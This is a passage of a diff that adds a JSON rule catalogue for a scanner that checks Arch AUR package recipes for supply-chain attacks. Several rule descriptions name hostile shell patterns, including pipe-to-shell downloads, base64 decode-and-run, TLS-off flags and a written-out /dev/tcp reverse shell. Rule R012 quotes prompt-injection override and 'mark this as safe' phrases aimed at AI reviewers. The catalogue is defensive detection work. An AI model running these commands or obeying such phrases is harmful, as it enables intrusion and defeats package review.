+    "severity": "INFO",
+    "categoryTitle": "Corpus Behavioral",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/corpus-behavioral/#h061"
+  },
+  "h062": {
+    "id": "H062",
+    "name": "Pacman Hook Installed",
+    "severity": "MEDIUM",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h062"
+  },
+  "h063": {
+    "id": "H063",
+    "name": "Epoch Introduced",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h063"
+  },
+  "h064": {
+    "id": "H064",
+    "name": "Provides/Replaces Scope Expansion",
+    "severity": "HIGH",
+    "categoryTitle": "Naming and Dependencies",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/naming-and-dependency/#h064"
+  },
+  "h065": {
+    "id": "H065",
+    "name": "Obfuscated Literal Reconstructed",
+    "severity": "INFO",
+    "categoryTitle": "Obfuscation",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/obfuscation/#h065"
+  },
+  "h066": {
+    "id": "H066",
+    "name": "Embedded Binary In Tree",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h066"
+  },
+  "h067": {
+    "id": "H067",
+    "name": "Anti-Analysis Check",
+    "severity": "HIGH",
+    "categoryTitle": "Deception and Anti-Analysis",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/deception/#h067"
+  },
+  "h068": {
+    "id": "H068",
+    "name": "Reconstructed Executable Payload",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h068"
+  },
+  "h069": {
+    "id": "H069",
+    "name": "Build-time Generation Then Execution",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h069"
+  },
+  "h070": {
+    "id": "H070",
+    "name": "Archive Trailer Anomaly",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h070"
+  },
+  "h071": {
+    "id": "H071",
+    "name": "Covert Egress",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h071"
+  },
+  "h072": {
+    "id": "H072",
+    "name": "Write Then Execute",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h072"
+  },
+  "h073": {
+    "id": "H073",
+    "name": "Introduction Rate Deviation",
+    "severity": "MEDIUM",
+    "categoryTitle": "Corpus Behavioral",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/corpus-behavioral/#h073"
+  },
+  "h074": {
+    "id": "H074",
+    "name": "Adopt-then-Modify",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h074"
+  },
+  "h075": {
+    "id": "H075",
+    "name": "Remote Script Via Process Substitution",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h075"
+  },
+  "h076": {
+    "id": "H076",
+    "name": "Build Writes Outside Staging Root",
+    "severity": "HIGH",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#h076"
+  },
+  "h077": {
+    "id": "H077",
+    "name": "Parse-time Network Fetch",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h077"
+  },
+  "h078": {
+    "id": "H078",
+    "name": "Signing Key Set Changed",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h078"
+  },
+  "h079": {
+    "id": "H079",
+    "name": "Build Flags Weakened",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h079"
+  },
+  "h080": {
+    "id": "H080",
+    "name": "Indirect Command Expansion",
+    "severity": "CRITICAL",
+    "categoryTitle": "Obfuscation",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/obfuscation/#h080"
+  },
+  "h081": {
+    "id": "H081",
+    "name": "Committed File Executed Without Declaration",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h081"
+  },
+  "h082": {
+    "id": "H082",
+    "name": "Fetch Then Execute",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h082"
+  },
+  "h083": {
+    "id": "H083",
+    "name": "Downloaded Source File Executed",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h083"
+  },
+  "h084": {
+    "id": "H084",
+    "name": "Service ExecStart Targets Undeclared Binary",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h084"
+  },
+  "h085": {
+    "id": "H085",
+    "name": "PATH Injection With Undeclared Directory",
+    "severity": "HIGH",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#h085"
+  },
+  "h086": {
+    "id": "H086",
+    "name": "Adopted From Orphan",
+    "severity": "MEDIUM",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h086"
+  },
+  "h087": {
+    "id": "H087",
+    "name": "Recipe Changed Without Upstream",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h087"
+  },
+  "h088": {
+    "id": "H088",
+    "name": "Adopted, Recipe Rewritten, Unpinned Fetch",
+    "severity": "HIGH",
+    "categoryTitle": "Maintainer and Metadata",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/maintainer-and-metadata/#h088"
+  },
+  "h089": {
+    "id": "H089",
+    "name": "Packaged File Names A Build-Only Path",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h089"
+  },
+  "h090": {
+    "id": "H090",
+    "name": "Committed Companion Carries A Fetch-Execute Payload",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h090"
+  },
+  "h091": {
+    "id": "H091",
+    "name": "Checksum Array Shorter Than Source Array",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h091"
+  },
+  "h092": {
+    "id": "H092",
+    "name": "Metadata Names A Source The Recipe Does Not",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h092"
+  },
+  "h093": {
+    "id": "H093",
+    "name": "Committed Config Points At A Build-Only Path",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h093"
+  },
+  "h094": {
+    "id": "H094",
+    "name": "Unread Script Executed During Packaging",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#h094"
+  },
+  "h095": {
+    "id": "H095",
+    "name": "Boot Or Image Artifact Built From The Source Tree",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h095"
+  },
+  "h096": {
+    "id": "H096",
+    "name": "Download Agent Override",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h096"
+  },
+  "h097": {
+    "id": "H097",
+    "name": "Function Shadowing",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h097"
+  },
+  "h098": {
+    "id": "H098",
+    "name": "Naming/Deception Cluster",
+    "severity": "HIGH",
+    "categoryTitle": "Composition",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/composition/#h098"
+  },
+  "h099": {
+    "id": "H099",
+    "name": "Source Host Swapped Under A Kept Local Name",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h099"
+  },
+  "h100": {
+    "id": "H100",
+    "name": "Install Hook Added Or Retargeted",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#h100"
+  },
+  "h101": {
+    "id": "H101",
+    "name": "Source Pinning Lost",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h101"
+  },
+  "h102": {
+    "id": "H102",
+    "name": "Maintainer Change With Signing Key Change",
+    "severity": "HIGH",
+    "categoryTitle": "Composition",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/composition/#h102"
+  },
+  "h103": {
+    "id": "H103",
+    "name": "Metadata And Recipe Disagree",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#h103"
+  },
+  "m001": {
+    "id": "M001",
+    "name": "Claim Contradicted By Structure",
+    "severity": "HIGH",
+    "categoryTitle": "Meta and Confluence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/meta/#m001"
+  },
+  "m002": {
+    "id": "M002",
+    "name": "Weak Signal Across Layers",
+    "severity": "MEDIUM",
+    "categoryTitle": "Meta and Confluence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/meta/#m002"
+  },
+  "m003": {
+    "id": "M003",
+    "name": "Composition Not Owned Elsewhere",
+    "severity": "MEDIUM",
+    "categoryTitle": "Meta and Confluence",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/meta/#m003"
+  },
+  "r001": {
+    "id": "R001",
+    "name": "Remote Script Execution",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Detects `curl | bash`, `curl | sh`, and variants including `python`, `zsh`, `dash`, `busybox sh`, and `source /dev/stdin`. This is the most common careless malice pattern in AUR PKGBUILDs: downloading a script and piping it directly to a shell without verification.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r001"
+  },
+  "r002": {
+    "id": "R002",
+    "name": "Wget Pipe to Shell",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Same as R001 but for `wget`. Separate rule per tool to allow per-tool tuning.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r002"
+  },
+  "r003": {
+    "id": "R003",
+    "name": "Base64 Decode and Execute",
+    "severity": "CRITICAL",
+    "categoryTitle": "Obfuscation",
+    "description": "Detects `base64 -d |` and `base64 --decode |` piped to execution. Base64-encoded scripts are a common obfuscation technique to hide malicious commands from casual review.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/obfuscation/#r003"
+  },
+  "r007": {
+    "id": "R007",
+    "name": "Install File Modification",
+    "severity": "MEDIUM",
+    "categoryTitle": "Install and Persistence",
+    "description": "Fires when a `.install` file is added or modified in the diff. Install scripts run with root privileges and are a common vector for persistent backdoors.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#r007"
+  },
+  "r008": {
+    "id": "R008",
+    "name": "Unexpected File Download",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Detects language runtimes downloading scripts from URLs: `python -c <url>`, `ruby -c <url>`, `perl -c <url>`. An unusual pattern that indicates a runtime fetching and executing code from a remote server.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r008"
+  },
+  "r010": {
+    "id": "R010",
+    "name": "Uses curl in PKGBUILD",
+    "severity": "LOW",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Detects `curl` commands inside function bodies. Does not fire in comments or messages. Low severity because curl is a legitimate build tool; the presence alone is not suspicious, but combined with other signals it adds context.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r010"
+  },
+  "r011": {
+    "id": "R011",
+    "name": "Uses wget in PKGBUILD",
+    "severity": "LOW",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Same rationale as R010 but for `wget`. Separate rule per tool.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r011"
+  },
+  "r012": {
+    "id": "R012",
+    "name": "LLM Prompt Injection",
+    "severity": "FATAL",
+    "categoryTitle": "Deception and Anti-Analysis",
+    "description": "Detects template-shaped text addressed to whoever *reads* the PKGBUILD rather than to the shell that runs it: instruction overrides (\"ignore the previous instructions\"), role markers (`system:`, `assistant:`), tag-like injections (`<system>`, `<instructions>`), personas (\"you are a helpful model...\"), suppression orders (\"do not flag/warn/analyze\") and pre-declared verdicts (\"mark this as safe\"). Comment lines are scanned, unlike every rule that describes what the shell executes, because this is reviewer-facing text. Calibrated at 22/22 labelled injection fixtures with 0 fires across the historical 3,739-diff benign corpus. This is a **reviewer-directed template tripwire**, not proof of an author's intent or a general prompt-injection detector: a match requires reviewer scrutiny, and a non-match establishes nothing. Score hard-stops at 100 regardless of other signals.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/deception/#r012"
+  },
+  "r013": {
+    "id": "R013",
+    "name": "Unicode Bidi Override",
+    "severity": "FATAL",
+    "categoryTitle": "Deception and Anti-Analysis",
+    "description": "Detects directionality overrides, isolates, invisible operators, tag characters, and zero-width joiners placed between ASCII neighbours. These codepoints can make displayed text differ from executed text. The ASCII-neighbour restriction preserves attacks hidden inside ASCII commands or URLs while dropping legitimate use in localized `GenericName[...]` lines.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/deception/#r013"
+  },
+  "r017": {
+    "id": "R017",
+    "name": "Setuid/Setgid Permission",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "Detects symbolic `chmod ... +s` commands that set a setuid or setgid bit. A setuid binary runs with its owner's privileges, the shape of many local-privilege-escalation backdoors. R053 and R059 own the target-specific symbolic and octal forms, so R017 defers to them rather than scoring one command twice.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#r017"
+  },
+  "r039": {
+    "id": "R039",
+    "name": "Eval With Dynamic Content",
+    "severity": "CRITICAL",
+    "categoryTitle": "Obfuscation",
+    "description": "Detects `eval` applied to a variable, command substitution, or backtick expression. The payload is assembled at runtime, so no static pattern can see what will execute.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/obfuscation/#r039"
+  },
+  "r040": {
+    "id": "R040",
+    "name": "Shell -c With Dynamic Payload",
+    "severity": "CRITICAL",
+    "categoryTitle": "Obfuscation",
+    "description": "Detects `sh -c` / `bash -c` whose argument contains a variable or substitution rather than a literal command.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/obfuscation/#r040"
+  },
+  "r041": {
+    "id": "R041",
+    "name": "Shell Network Redirection",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Bash's `/dev/tcp` and `/dev/udp` pseudo-devices open network sockets with no external binary. The canonical reverse shell is `bash -i >& /dev/tcp/host/port 0>&1`. Matching the bare path rather than a redirection operator covers the `>&` and `exec 3<>` forms alike.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r041"
+  },
+  "r042": {
+    "id": "R042",
+    "name": "Download Then Execute",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Detects the download-then-run chain: fetch to a path, optionally `chmod +x`, then execute it. Each step alone is unremarkable; the sequence is not.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r042"
+  },
+  "r043": {
+    "id": "R043",
+    "name": "Base64 Blob Decode",
+    "severity": "CRITICAL",
+    "categoryTitle": "Obfuscation",
+    "description": "Detects `base64 -d` fed from a here-string or a variable, as opposed to decoding a file that is itself part of the source array.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/obfuscation/#r043"
+  },
+  "r044": {
+    "id": "R044",
+    "name": "Interpreter One-Liner With Network",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Detects an interpreter one-liner (`-e`) that references network APIs (`socket`, `urllib`, `LWP`, `Net::`) or an inline URL.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r044"
+  },
+  "r045": {
+    "id": "R045",
+    "name": "Binary Encoding Pipe",
+    "severity": "MEDIUM",
+    "categoryTitle": "Obfuscation",
+    "description": "Detects `xxd` or `uudecode` piped onward. Both reconstruct binary content from a text representation, a way to carry a payload past text review.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/obfuscation/#r045"
+  },
+  "r046": {
+    "id": "R046",
+    "name": "Source URL Uses IP Address",
+    "severity": "MEDIUM",
+    "categoryTitle": "Fetch and Execution",
+    "description": "A source URL pointing at a bare IP address bypasses DNS and any domain reputation the bucket classifier could apply.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r046"
+  },
+  "r047": {
+    "id": "R047",
+    "name": "Source URL Uses Non-Standard Port",
+    "severity": "LOW",
+    "categoryTitle": "Fetch and Execution",
+    "description": "A source URL on a port other than 80, 443, 8080, or 8443. Unusual ports suggest a service that is not a conventional distribution host.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r047"
+  },
+  "r048": {
+    "id": "R048",
+    "name": "Source URL On Free Registrar TLD",
+    "severity": "LOW",
+    "categoryTitle": "Fetch and Execution",
+    "description": "A source URL on a free-registrar TLD (`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.pw`). These carry no registration cost and are disproportionately used for throwaway infrastructure. Deliberately excludes `.xyz` and `.top`, which have substantial legitimate use.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r048"
+  },
+  "r049": {
+    "id": "R049",
+    "name": "Compiler Plugin Or Loader Override",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "`-fplugin=` loads an arbitrary shared object into the compiler; `-Wl,--dynamic-linker=` changes which loader the produced binary uses. Both alter the build without touching any source file.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#r049"
+  },
+  "r050": {
+    "id": "R050",
+    "name": "Compiler Hardening Disabled",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "Detects removal of stack-protector or NX protections from the build flags.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#r050"
+  },
+  "r051": {
+    "id": "R051",
+    "name": "Network Access In pkgver",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "`pkgver()` runs during version resolution, before a reviewer sees the build. Network access there executes ahead of any inspection step. Scoped to `pkgver` so that `curl` in `build()` is unaffected, and matched against fetching subcommands only; `git describe`, the standard VCS idiom, is local and must not fire.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r051"
+  },
+  "r052": {
+    "id": "R052",
+    "name": "Dotfile Written To User Profile",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "Detects writes to a dotfile under `$HOME`, `~`, `/root`, or `/home/<user>`, the shape of shell-profile persistence. Dotfiles written inside `$pkgdir` (such as `/etc/skel` templates) are ordinary packaging and do not match.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#r052"
+  },
+  "r053": {
+    "id": "R053",
+    "name": "Setuid Or Setgid Bit Set In Package Root",
+    "severity": "MEDIUM",
+    "categoryTitle": "Install and Persistence",
+    "description": "Setuid or setgid applied to a path being staged into the package. Detects both octal (`4755`, `2755`) and symbolic (`u+s`) forms, on `chmod` and on `install -m`; ordinary modes such as `644`, `755` and `+x` do not match. Chromium's sandbox helper legitimately requires `4755`, so this fires on essentially every Electron package. Measured across the benign corpus, MEDIUM changes **no** package's risk band; the evidence stays visible in the tiered breakdown without reclassifying routine updates. At HIGH it would have reclassified every Electron package as Medium.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#r053"
+  },
+  "r054": {
+    "id": "R054",
+    "name": "Persistence Unit Outside Package Root",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "Detects a cron job or systemd unit written to a system path. A unit staged into `$pkgdir` is flagged too, in any quoting style (`\"${pkgdir}\"/usr/lib/...`, `\"${pkgdir}/usr/lib/...\"`, `$pkgdir/usr/lib/...`): pacman installs what the recipe staged, so all three produce the same persistent root-level unit. Writing to the live filesystem during a build is the worse case of the same finding.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#r054"
+  },
+  "r055": {
+    "id": "R055",
+    "name": "Git Clone With Variable Branch",
+    "severity": "MEDIUM",
+    "categoryTitle": "Fetch and Execution",
+    "description": "A `git clone --branch $var` resolves at build time to whatever the variable holds, so the pinned ref is not actually pinned.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r055"
+  },
+  "r056": {
+    "id": "R056",
+    "name": "Download Then Source",
+    "severity": "CRITICAL",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Detects a download followed by `source` or `.`, which executes the fetched file in the current shell.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r056"
+  },
+  "r057": {
+    "id": "R057",
+    "name": "TLS Verification Disabled",
+    "severity": "HIGH",
+    "categoryTitle": "Fetch and Execution",
+    "description": "Detects the documented TLS-off flag of every catalogued client: `curl --insecure`/`-k`, `wget --no-check-certificate`, `git -c http.sslVerify=false`, `pip --trusted-host`, `npm --strict-ssl=false` and `deno --unsafely-ignore-certificate-errors`, plus the `GIT_SSL_NO_VERIFY` and `NODE_TLS_REJECT_UNAUTHORIZED=0` environment assignments. Disabling certificate verification makes the transport trivially interceptable. The `-k` match requires a preceding word boundary so that flags such as `--keepalive-time` do not trigger it. `--no-verify` is deliberately absent: for bun and cargo it skips lifecycle scripts, not TLS; bun/node disable TLS through the Node compatibility variable instead, and cargo's transport is git (`http.sslVerify`), already covered.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r057"
+  },
+  "r058": {
+    "id": "R058",
+    "name": "Write Outside Package Root",
+    "severity": "HIGH",
+    "categoryTitle": "Staging and Reconnaissance",
+    "description": "Detects writes to `/etc`, `/boot`, `/usr/bin`, or `/usr/lib` by absolute path. The same write prefixed with `$pkgdir` is normal packaging and does not match.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/staging-and-recon/#r058"
+  },
+  "r059": {
+    "id": "R059",
+    "name": "Setuid Or Setgid Bit Set Outside Package Root",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "The same operation against an absolute path. This touches the live filesystem rather than `$pkgdir`, so it is a privilege change on the build host and not packaging. Split from R053 because the two are materially different: `chmod u+s \"$pkgdir/opt/x/chrome-sandbox\"` is ordinary Electron packaging, while `chmod u+s \"/usr/bin/helper\"` is not.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#r059"
+  },
+  "r078": {
+    "id": "R078",
+    "name": "Compression Command Override",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#r078"
+  },
+  "r091": {
+    "id": "R091",
+    "name": "Privilege Escalation Override",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#r091"
+  },
+  "r099": {
+    "id": "R099",
+    "name": "Trap Statement",
+    "severity": "MEDIUM",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#r099"
+  },
+  "r104": {
+    "id": "R104",
+    "name": "Error Handling Suppressed",
+    "severity": "HIGH",
+    "categoryTitle": "Integrity and Verification",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/integrity/#r104"
+  },
+  "r144": {
+    "id": "R144",
+    "name": "Packaged File Points At A World-Writable Path",
+    "severity": "HIGH",
+    "categoryTitle": "Install and Persistence",
+    "description": "A file staged into the package root names a program under a world-writable directory. Anyone can replace the target after the package is built, so the installed path is not under the packager's control.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/install-and-persist/#r144"
+  },
+  "r152": {
+    "id": "R152",
+    "name": "Source URL On Free-Hosting Or Dynamic-DNS Host",
+    "severity": "MEDIUM",
+    "categoryTitle": "Fetch and Execution",
+    "description": "A source URL hosted on a free-hosting, dynamic-DNS or tunnelling provider. Naming one of these costs nothing and leaving it costs nothing, so a source served from here is a claim a reviewer has to judge rather than an upstream distribution channel. The list is split into dynamic DNS (`duckdns.org`, `no-ip.org`, ...), tunnels (`ngrok-free.app`, `trycloudflare.com`, ...) and free/static hosting (`pages.dev`, `github.io`, `vercel.app`, ...). The free-hosting group is the tunable one: small projects do occasionally publish release assets there, so it is the first thing to trim in `hosts.toml free_hosting_domains` if it misfires. The leading `\\.` makes this a subdomain match, so `duckdns.org.evil.com` does not fire.",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/fetch-and-execution/#r152"
+  },
+  "s001": {
+    "id": "S001",
+    "name": "Recursive Self-Spawn",
+    "severity": "CRITICAL",
+    "categoryTitle": "Sabotage",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/sabotage/#s001"
+  },
+  "s002": {
+    "id": "S002",
+    "name": "Recursive Deletion Outside The Build Tree",
+    "severity": "CRITICAL",
+    "categoryTitle": "Sabotage",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/sabotage/#s002"
+  },
+  "s003": {
+    "id": "S003",
+    "name": "Raw Block Device Write",
+    "severity": "CRITICAL",
+    "categoryTitle": "Sabotage",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/sabotage/#s003"
+  },
+  "s004": {
+    "id": "S004",
+    "name": "Secure Deletion Of User Data",
+    "severity": "HIGH",
+    "categoryTitle": "Sabotage",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/sabotage/#s004"
+  },
+  "s005": {
+    "id": "S005",
+    "name": "Permission Change On A System Path",
+    "severity": "HIGH",
+    "categoryTitle": "Sabotage",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/sabotage/#s005"
+  },
+  "s006": {
+    "id": "S006",
+    "name": "System Service Disruption",
+    "severity": "HIGH",
+    "categoryTitle": "Sabotage",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/sabotage/#s006"
+  },
+  "s007": {
+    "id": "S007",
+    "name": "Cryptocurrency Miner",
+    "severity": "HIGH",
+    "categoryTitle": "Sabotage",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/sabotage/#s007"
+  },
+  "s008": {
+    "id": "S008",
+    "name": "Shell History Or Log Destruction",
+    "severity": "MEDIUM",
+    "categoryTitle": "Sabotage",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/sabotage/#s008"
+  },
+  "t001": {
+    "id": "T001",
+    "name": "Signing-Key Novelty",
+    "severity": "HIGH",
+    "categoryTitle": "Temporal Context",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#t001"
+  },
+  "t002": {
+    "id": "T002",
+    "name": "Maintainer Domain Novelty",
+    "severity": "MEDIUM",
+    "categoryTitle": "Temporal Context",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#t002"
+  },
+  "t003": {
+    "id": "T003",
+    "name": "Signing Key Rotated",
+    "severity": "HIGH",
+    "categoryTitle": "Temporal Context",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/temporal/#t003"
+  },
+  "u001": {
+    "id": "U001",
+    "name": "Manifest Added Or Removed",
+    "severity": "INFO",
+    "categoryTitle": "Upstream Manifests",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/upstream-manifests/#u001"
+  },
+  "u002": {
+    "id": "U002",
+    "name": "Upstream Dependency Delta",
+    "severity": "INFO",
+    "categoryTitle": "Upstream Manifests",
+    "description": "",
+    "docsUrl": "https://docs.trustsight.org/reference/rules/upstream-manifests/#u002"
+  },
+  "u003": {
